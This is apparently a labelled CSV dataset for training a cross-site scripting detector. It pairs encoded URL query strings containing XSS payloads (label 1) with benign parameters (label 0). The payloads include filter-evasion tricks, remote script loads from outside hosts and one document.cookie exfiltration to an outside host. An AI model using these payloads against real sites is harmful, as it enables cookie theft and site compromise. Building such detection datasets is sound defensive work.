text,label
/tab_1?uid=%3Cinput%20value%3D%3C%3E%3Ciframe/src%3Djavascript%3Aconfirm%281%29,1
/meridia?caneditdomain=caneditdomain,0
/ir?broken=%3CBODY%20ONLOAD%3Dalert%28%22XSS%22%29%3E,1
/002847?latitude=latitude,0
/Picks?mtext=%3CIMGSRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%3CWBR%3E%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%3CWBR%3E%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%3CWBR%3E%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3CWBR%3E%3B%26%2383%3B%26%2339%3B%26%2341%3E,1
/medal?bottom=bottom,0
/Arrow?changeUserGroup=changeUserGroup,0
/20054?tftp=%3Cisindex/autofocus/onfocus%3Dalert%28%29%3E,1
/Burke?casein=casein,0
/12342?addcomment=addcomment,0
/189748_1?cfgval=cfgval,0
/0816?ex=%3Csvg%20contentScriptType%3Dtext/vbs%3E%3Cscript%3EMsgBox%2B1,1
/002143?dbname=dbname,0
/11603?mount=mount,0
/appli?peruserbw=peruserbw,0
/cutecast?gadget=%3Cbody%20onMouseOver%20body%20onMouseOver%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onMouseOver%3E,1
/1509?city=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx85expression%28javascript%3Aalert%281%29%22%3EDEF,1
/subscribing?clearLogs=clearLogs,0
/sally?years=years,0
/1444?NEWNAME=NEWNAME,0
/13789?content=%3CA%20HREF%3D%22http%3A//0x42.0x0000066.0x7.0x93/%22%3EXSS%3C/A%3E,1
/bi_dissatisfied?job=%3CIMG%20SRC%3D%23%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/burst?sqlhost1=%3CIMG%20SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/sect?typ=%3Cdiv%20style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX,1
/003076?traffic=%3Ciframe%20src%3Dhttp%3A//ha.ckers.org/scriptlet.html%20%3C,1
/67717?foldername=%3Cdiv/style%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C/div%3E%20%7BIE7%7D,1
/palestras?library=library,0
/3650786?clockstats=%3Csvg%20onload%3D%22javascript%3Aalert%28123%29%22%20xmlns%3D%22%23%22%3E%3C/svg%3E,1
/index_36?pass1=pass1,0
/utwente?save=save,0
/F-Liquid_23?textonly=textonly,0
/scores?id9level=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx00onerror%3Djavascript%3Aalert%281%29%3E,1
/fallback?callop=%3CLINK%20REL%3D%22stylesheet%22%20HREF%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,1
/37641?newver=%3Cinput/onmouseover%3D%22javaSCRIPT%26colon%3Bconfirm%26lpar%3B1%26rpar%3B%22,1
/111757?goback=goback,0
/0409-advisories?zip=%3CXSS%20STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E,1
/Lexicon?mobj=%3Cimg/src%3D%27http%3A//i.imgur.com/P8mL8.jpg%27%20onmouseover%3D%26Tab%3Bprompt%281%29,1
/4110?savemode=%3CIMG%20SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/Catz?cfil=%22%60%27%3E%3Cscript%3E%5CxE3%5Cx80%5Cx80javascript%3Aalert%281%29%3C/script%3E,1
/gfigermany?span=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Ealert%28%27gotcha%27%29%3B%3C%21%5BCDATA%5B%3C%5D%5D%3E/SCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E%3C/foo%3E,1
/introduction?fwdelay=%3CIMG%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/newspage-80?authkey=%3Cimg/src%3D%60%2500%60%20onerror%3Dthis.onerror%3Dconfirm%281%29,1
/page7?untrash=untrash,0
/forumid_20?language=%3C%3BBGSOUND%20SRC%3D%22%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B,1
/guestbk?logall=%3Cmeta%20charset%3D%22x-imap4-modified-utf7%22%3E%26%3Cscript%26S1%26TS%261%3Ealert%26A7%26%281%29%26R%26UA%3B%26%26%3C%26A9%2611/script%26X%26%3E,1
/0619217065?color2=%3Ctable%3E%3CTD%20BACKGROUND%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/DiskMonitor?verified=%26lt%3BIMG%20%26quot%3B%26quot%3B%26quot%3B%26gt%3B%26lt%3BSCRIPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B/SCRIPT%26gt%3B%26quot%3B%26gt%3B,1
/save?deleterule=%3Cimg/src%3D%40%26%2332%3B%26%2313%3B%20onerror%20%3D%20prompt%28%27%26%2349%3B%27%29,1
/leaderboard?html=html,0
/imagez?publicUpload=publicUpload,0
/9714?todate=todate,0
/cauce_canada?downloadpos=%3CTABLE%3E%3CTD%20BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/admentor?dbPort=%26lt%3BIMG%20SRC%3D%5C%22livescript%26%23058%3B%26%2391%3Bcode%26%2393%3B%5C%22%26gt%3B,1
/334-specialreport?sortBy=%3Cimg%20src%5Cx13%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/Ap?pftext=pftext,0
/OrangeBox-Mail?secret=%3CA%20HREF%3D%22http%3A//1113982867/%22%3EXSS%3C/A%3E,1
/must-haves?platform=platform,0
/arrow_big?macname=macname,0
/001207?mkF=mkF,0
/19613?oauth=oauth,0
/freevideoticket270?npassword=npassword,0
/decks?bps=bps,0
/calender?tabid=tabid,0
/_2006?dirupload=perl%20-e%20%26%23039%3Bprint%20%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B/SCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B%20%26gt%3B%20out,1
/3 Popular Music Videos?peruserbw=perl%20-e%20%27print%20%5C%22%26lt%3BIMG%20SRC%3Djava%5C0script%26%23058%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26gt%3B%5C%22%3B%27%20%26gt%3B%20out,1
/922?frame=frame,0
/2002q4?addUserGroup=%3CHEAD%3E%3CMETA%20HTTP-EQUIV%3D%22CONTENT-TYPE%22%20CONTENT%3D%22text/html%3B%20charset%3DUTF-7%22%3E%20%3C/HEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-/SCRIPT%2BAD4-,1
/frogs?lineid=lineid,0
/webdev?agentoption=Redirect%20302%20/a.jpg%20http%3A//victimsite.com/admin.asp%26amp%3Bdeleteuser,1
/knowledge_centre?proxypassword=proxypassword,0
/identification?3=3,0
/basecamp?perms8=perms8,0
/bblfish?UserRecoveryForm=UserRecoveryForm,0
/wowbanner?validateValue=validateValue,0
/calen?mvdi=%3Cimg%20STYLE%3D%22xss%3Aexpr/%2AXSS%2A/ession%28document.vulnerable%3Dtrue%29%22%3E,1
/URLEmbeddedAttacks?charsout=charsout,0
/flag_italy?reason=reason,0
/4993?ld=ld,0
/tkde?mobilephone=mobilephone,0
/close?tableFields=tableFields,0
/Headers?ondemand=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx8Ajavascript%3Aalert%281%29%3C/script%3E,1
/2572?SettingsForm=SettingsForm,0
/obrazy?rownum=rownum,0
/20051110?cust=%3C%3F%20foo%3D%22%3E%3Cx%20foo%3D%27%3F%3E%3Cscript%3Ealert%281%29%3C/script%3E%27%3E%22%3E,1
/Markets_normal?msgfield=%3Cstyle%3Eli%20%7Blist-style-image%3A%20url%28%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%29%3B%3C/STYLE%3E%3CUL%3E%3CLI%3EXSS,1
/hdr_news?commander=%26lt%3BIMG%20SRC%3Djavascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%26gt%3B,1
/Investment?Upload=Upload,0
/000025?indent=indent,0
/Nov2006?rstarget1=%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C/IFRAME%3E,1
/product_reviews?rolename=rolename,0
/archit?identifiant=identifiant,0
/5561?tagname=tagname,0
/01491?webguiproto=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx86expression%28javascript%3Aalert%281%29%22%3EDEF,1
/all_books?cP=%3C%3BLAYER%20SRC%3D%22%3Bhttp%3A//ha.ckers.org/scriptlet.html%22%3B%3E%3B%3C%3B/LAYER%3E%3B,1
/skin-care?makedoc=makedoc,0
/everquest2?plan=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx83expression%28javascript%3Aalert%281%29%22%3EDEF,1
/DAD?vbxsite=vbxsite,0
/SeattleWirelessVoIP?prof=%3Cscript%5Cx0Dtype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/confused?htcc=%3CBR%20SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E,1
/readerrequest?community=community,0
/21404?service=%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Djavascript%3Ajavascript%3Aalert%281%29%3B%22%3E,1
/10729?ZipName=%3Ciframe/src%20%5C/%5C/onload%20%3D%20prompt%281%29,1
/usericons?dragdroporder=%3Cscript%20a%3D%22%3E%22%20%27%27%20SRC%3D%22http%3A//www.securitycompass.com/xss.js%22%3E%3C/script%3E,1
/regular_expressions?yellowfan=yellowfan,0
/2170213?tn=%3Cobject%20onbeforeload%20object%20onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/object%20onbeforeload%3E,1
/let?onserver=%3CIMG%20SRC%3D%23%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/7369?Setting=%3Cdiv%20id%3D%22x%22%3EXXX%3C/div%3E%20%3Cstyle%3E%20%20%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D%20%20%23y%5D%3Bcolor%3Ared%3B%7B%7D%20%20%3C/style%3E,1
/2002_04?preg=%3Ca%20href%3D%22data%3Atext/html%3Bblabla%2C%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2332%26%23115%26%23114%26%2399%26%2361%26%2334%26%23104%26%23116%26%23116%26%23112%26%2358%26%2347%26%2347%26%23115%26%23116%26%23101%26%23114%26%23110%26%23101%26%23102%26%2397%26%23109%26%23105%26%23108%26%23121%26%2346%26%23110%26%23101%26%23116%26%2347%26%23102%26%23111%26%23111%26%2346%26%23106%26%23115%26%2334%26%2362%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%238203%22%3EClick%20Me%3C/a%3E,1
/twentymajor?itemStatus=itemStatus,0
/samochody?errormsg=%3CSTYLE%3Eli%20%7Blist-style-image%3A%20url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EXSS%3C/br%3E,1
/oo?imagedetails=%22%60%27%3E%3Cscript%3E%5CxEF%5CxBF%5CxBEjavascript%3Aalert%281%29%3C/script%3E,1
/virgin?deletedir=%3Cscript%20/%2A%2A%2A/%3E/%2A%2A%2A/confirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29/%2A%2A%2A/%3C/script%20/%2A%2A%2A/,1
/accounting-finance?cantidad=cantidad,0
/Guy?cmdex=cmdex,0
/0900?mon=mon,0
/top_14?placeID=%3Cdiv%20style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EXXX,1
/16081690?16=%3CIMG%20LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/2354?valor=valor,0
/Divorce?bool=%22%3E%3Ch1%3E%3CIFRAME%20width%3D%22420%22%20height%3D%22315%22%20SRC%3D%22http%3A//www.youtube.com/embed/sxvccpasgTE%22%20frameborder%3D%220%22%20onmouseover%3D%22alert%28document.cookie%29%22%3E%3C/IFRAME%3E123%3C/h1%3E,1
/6950?zone=zone,0
/link_2?gt=%3CScRipT%205-0%2A3%2B9/3%3D%3Eprompt%281%29%3C/ScRipT%20giveanswerhere%3D%3F,1
/arrow_btn?compression=%3Cx%20style%3D%22behavior%3Aurl%28%25%28sct%29s%29%22%3E,1
/Catalog?sh3=%3Ca%20href%3D%22%5CxE1%5CxA0%5Cx8Ejavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/4047?fonte=fonte,0
/marty_burns?yellowstales=yellowstales,0
/cell_phone?fee=fee,0
/f53?unspammed=unspammed,0
/7146?codetype=codetype,0
/sim?aliasid=%22onclick%3Dprompt%288%29%3E%22%40x.y,1
/3286193?canceldelete=canceldelete,0
/tpp?passwordfld=%3CIMG%20SRC%3Dx%20onclick%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/communiques?AUTH=AUTH,0
/wombat?groupdel=groupdel,0
/IV?category=category,0
/TopStory?id15gid=%5C%22%3Balert%28%27XSS%27%29%3B//,1
/simulate?EXPORTTABLE=%3Cobject%20id%3D%22x%22%20classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C/object%3E%20%3Cobject%20classid%3D%22clsid%3A02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error%3D%22javascript%3Aalert%281%29%22%20style%3D%22behavior%3Aurl%28%23x%29%3B%22%3E%3Cparam%20name%3Dpostdomevents%20/%3E%3C/object%3E,1
/function?queue=%3Ca%20href%3D%22javas%5Cx0Dcript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/venom?pi=%5C%26quot%3B%3Balert%28%26apos%3BXSS%26apos%3B%29%3B//,1
/kelly_dwyer?rolename=%3CIMG%20SRC%3Dx%20onscroll%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/womensshoes?changecurrent=changecurrent,0
/cortafuegos?id27gid=%22%3E%3Cs%22%252b%22cript%3Ealert%28document.cookie%29%3C/script%3E,1
/chupax?notmodrewrite=%3Capplet%20onReadyStateChange%20applet%20onReadyStateChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/applet%20onReadyStateChange%3E,1
/thisissue?memberTypeName=memberTypeName,0
/2172635?pattern=%3Cscript%3Eif%28%22x%5C%5CxE1%5Cx96%5Cx89%22.length%3D%3D2%29%20%7B%20javascript%3Aalert%281%29%3B%7D%3C/script%3E,1
/khafre?notes=notes,0
/1txt2?hideidentity=%3C~/XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28window.location%3D%22http%3A//www.procheckup.com/%3Fsid%3D%22%252bdocument.cookie%29%3E,1
/22001?passwordConfirm=%3Ca%20href%3D%22%5Cx08javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/bsd-exploits?dataangle=%3Cdiv%20style%3D%22width%3A%20expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E,1
/photoshop cs2?selectvalues=selectvalues,0
/D83-Konverter_v1?degrees=degrees,0
/calvin?expanded=%3Ca%20href%3D%22javas%5Cx07cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/mindbody?api=api,0
/hit?u1p=%3C/script%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C/script%3E,1
/index-52?alI=alI,0
/105411?bulk=bulk,0
/Model?aliA=%3Cdiv%20style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22%20onmouseover%3D%22prompt%281%29%22%20onclick%3D%22alert%281%29%22%3Ex%3C/button%3E,1
/chap13?M2=M2,0
/infopanel?adsr=adsr,0
/aparaty?deletefolder=%3CsVg%3E%3CscRipt%20%2500%3Ealert%26lpar%3B1%26rpar%3B%20%7BOpera%7D,1
/l14?remoteserver3=remoteserver3,0
/001170?options=options,0
/22382?Heads=Heads,0
/Battlefield_2?aclid=%3CXSS%20STYLE%3D%22behavior%3A%20url%28xss.htc%29%3B%22%3E,1
/76173?noajax=noajax,0
/ema?canpreview=%3Cstyle%3Ep%5Bfoo%3Dbar%7B%7D%2A%7B-o-link%3A%27javascript%3Ajavascript%3Aalert%281%29%27%7D%7B%7D%2A%7B-o-link-source%3Acurrent%7D%5D%7Bcolor%3Ared%7D%3B%3C/style%3E,1
/astro?mkdir=mkdir,0
/Thomas_Shinder?useR=useR,0
/20061212?redirectto=redirectto,0
/readerforpalm?disablefilter=disablefilter,0
/alqaeda?attachment=%3Cform%3E%3Cbutton%20formaction%3Djavascript%26colon%3Balert%281%29%3ECLICKME,1
/magazine?acfcomp=%3Cimg%20src%5Cx47%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/pfrank?dst=%22%60%27%3E%3Cscript%3E%5Cx2Bjavascript%3Aalert%281%29%3C/script%3E,1
/ramowka?argv=argv,0
/epoc?filenamepattern=filenamepattern,0
/11409?ts=%3Ca%20href%3D%22%5CxE2%5Cx81%5Cx9Fjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/Televisions?savemode=%3Cimg%20src%5Cx32%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/tender?coded=coded,0
/newmap?class=%3Cscript%3E/%2A%20%2A%5Cx2A/javascript%3Aalert%281%29//%20%2A/%3C/script%3E,1
/atl?mailing=%22%60%27%3E%3Cscript%3E%5CxC2%5Cx85javascript%3Aalert%281%29%3C/script%3E,1
/insert?extend=%3CSCRIPT%20SRC%3Dhttp%3A//ha.ckers.org/xss.js%3F%3C%20B%20%3E,1
/004047?guest=%3Cimg%20%22%22%22%3E%3Cscript%3Ealert%28%22XSS%20by%20%5Cnxss%22%29%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20xss%3C/h1%3E%3C/marquee%3E,1
/IW?navigation=navigation,0
/optional?code=%3Cvar%20onmouseover%3D%22prompt%281%29%22%3EOn%20Mouse%20Over%3C/var%3E,1
/surgeons?typename=%3Ca%20href%3D%22%5Cx04javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/lastyear?showinactive=%3Cimg%5Cx47src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/Get?fullsite=fullsite,0
/iap?bulletin=%26lt%3BSCRIPT%20a%3D%26quot%3B%3E%26apos%3B%3E%26quot%3B%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.js%26quot%3B%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/mailinglists?statetimeout=%3C%3BIMG%20SRC%3DJaVaScRiPt%3Aalert%28%27%3BXSS%27%3B%29%3E%3B,1
/19836?idstring=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx0Bonerror%3Djavascript%3Aalert%281%29%3E,1
/Pharmaceuticals?moveup=moveup,0
/217?eday=http%3A//www.google%3Cscript%20.com%3Ealert%28document.location%29%3C/script,1
/lmi?permerror=permerror,0
/20091?timedescr=%22%60%27%3E%3Cscript%3E%5Cx21javascript%3Aalert%281%29%3C/script%3E,1
/inserate?saveData=%3C%3BIFRAME%20SRC%3D%22%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B%3C%3B/IFRAME%3E%3B,1
/al-qaeda?verifycode=verifycode,0
/stratus?fromname=fromname,0
/collaborations?unpublished=%3Cscript%2Bsrc%3D%22%3E%22%2Bsrc%3D%22http%3A//yoursite.com/xss.js%3F69%2C69%22%3E%3C/script%3E,1
/mp3players?personality=%3CA%20HREF%3D%22http%3A//0102.0146.0007.00000223/%22%3EXSS%3C/A%3E,1
/spreadtheword?odbcdsn=%3CIMG%20SRC%3Dx%20onseeking%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/kamiya?syear=%3CIMG%20DYNSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,1
/post!default?languageID=languageID,0
/msgReader$1?AUTH=%3Cdiv/onmouseover%3D%27alert%281%29%27%3E%20style%3D%22x%3A%22%3E,1
/influence?locale=locale,0
/Straw_banner?textIn=textIn,0
/pm-topright?pollQuestion=%3Cscript%20a%3D%22%3E%22%20SRC%3D%22http%3A//www.securitycompass.com/xss.js%22%3E%3C/script%3E,1
/0596005423?mhost=%3C%21--%20--%20--%3E%3Cscript%3Edocument.vulnerable%3Dtrue%3B%3C/script%3E%3C%21--%20--%20--%3E,1
/oid?Blog=ABC%3Cdiv%20style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,1
/Mainframes?altmethodpayload=altmethodpayload,0
/acatalog?disablehttpredirect=%22%20onfocus%3Dalert%28document.domain%29%20%22%3E%20%3C%22,1
/15895?u12=%3CIMG%20SRC%3Dx%20onchange%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/1918?server=%3C/TITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C/SCRIPT%3E,1
/ms-security?dto=%3Cbody%20onbeforeunload%20body%20onbeforeunload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onbeforeunload%3E,1
/virgin?min=min,0
/0596007949?updated=updated,0
/janet?nolimit=nolimit,0
/f-117?accLimit=%3Cframeset%20onScroll%20frameset%20onScroll%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/frameset%20onScroll%3E,1
/000661?hash=hash,0
/StealthAUDIT?cvmodule=%22%60%27%3E%3Cscript%3E%5Cx0Djavascript%3Aalert%281%29%3C/script%3E,1
/19734?pdocon=%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe,1
/83341?response=response,0
/00107?referer2=referer2,0
/xcs?archivo=archivo,0
/Compaq?overwrite=%3CIMG%20DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/ing?reveal=%5C%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C/SCRIPT%3E%3Cimg%20src%3D%22%22%20alt%3D%5C%27,1
/localnews?updatedb=updatedb,0
/allediensten?t2=t2,0
/crucial?link=link,0
/structural?querytype=querytype,0
/Topic35?id32level=id32level,0
/listrentals?datetime=datetime,0
/9029?formage=formage,0
/01524?months=months,0
/schwartz?logdefaultpass=%3Cstyle%3E%3C/style%5Cx20%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,1
/rainbow-books?ppage=ppage,0
/t203?otp=%3Cembed%20src%3D%22http%3A//corkami.googlecode.com/svn/%21svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf%22%3E,1
/Management_Tools?pagenumber=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5B%3CIMG%20SRC%3D%22javas%5D%5D%3C%21%5Bcript%3Adocument.vulnerable%3Dtrue%3B%22%3E%5D%5D%3C/C%3E%3C/X%3E%3C/xml%3E%3CSPAN%20DATASRC%3D%23I%20DATAFLD%3DC%20DATAFORMATAS%3DHTML%3E%3C/span%3E,1
/5732?boardtheme=%3C%3BLAYER%20SRC%3D%22%3Bhttp%3A//ha.ckers.org/scriptlet.html%22%3B%3E%3B%3C%3B/LAYER%3E%3B,1
/client?INDEXTYPE=INDEXTYPE,0
/birdcast?assertion=assertion,0
/61618?PHPSESSID=%3Cdiv%20onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C/div%3E,1
/27?setdefault=setdefault,0
/mscplogo?second=second,0
/2026?id7level=%3Cimg%5Cx10src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/93119?realm=realm,0
/newstopic-12?dnssrcip=%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3B%20URL%3Dhttp%3A//%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/24278?rela=rela,0
/Encrypt?emails=%3Ca%20href%3D%22%5CxE1%5Cx9A%5Cx80javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/free-stuff?rm=rm,0
/topicssummary?appkey=appkey,0
/underwater?create=create,0
/vector?clearLogs=clearLogs,0
/14929?videoId=videoId,0
/ces?tableId=tableId,0
/fp-silverlining?usort=usort,0
/6247?dest=%3Cimg%20%5Cx34src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/C27?suspend=%3C%3BXML%20ID%3DI%3E%3B%3C%3BX%3E%3B%3C%3BC%3E%3B%3C%3B%21%5BCDATA%5B%3C%3BIMG%20SRC%3D%22%3Bjavas%5D%5D%3E%3B%3C%3B%21%5BCDATA%5Bcript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B%5D%5D%3E%3B,1
/lon?ical=%3E%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%26,1
/4676?updateType=updateType,0
/714388?USER=%26lt%3BIMG%20SRC%3D%5C%22jav%26%23x0A%3Bascript%26%23058%3Balert%28%27XSS%27%29%3B%5C%22%26gt%3B,1
/gray_rule?attachments=%3Cimg%20src%5Cx09%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/ABBYY?minus=%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C/IFRAME%3E,1
/0208?opauth=%3Ca%20onmouseover%3D%22alert%28document.cookie%29%22%3Exxs%20link%3C/a%3E,1
/usersearch?rempool=%22/%3E%3Cimg/onerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax%20/%3E,1
/cpu?u45=%3C%21--%5Bif%20gte%20IE%204%5D%3E%3CSCRIPT%3Edocument.vulnerable%3Dtrue%3B%3C/SCRIPT%3E%3C%21%5Bendif%5D--%3E,1
/5254?sendmethod=sendmethod,0
/6627?movie=movie,0
/ico3?sql=sql,0
/Picture%202?end=end,0
/20060119?makenote=makenote,0
/stryker?startdisplayingat=%3Cbr%20SIZE%3D%22%26%7Bdocument.vulnerable%3Dtrue%7D%22%3E,1
/rfp?mtype=mtype,0
/lead-generation?taxid=taxid,0
/61835?tradercap=%3Cimg%20src%3Dx%5Cx10onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/55794?stdlib=%26%23X03c,1
/question263?track=%26lt%3BSCRIPT%20%3D%26quot%3Bblah%26quot%3B%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.js%26quot%3B%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/index_20?store=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A//ha.ckers.org/xssmoz.xml%23xss%22%29%7D%3C/STYLE%3E,1
/90014?idlist=%3Cimg%20SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E,1
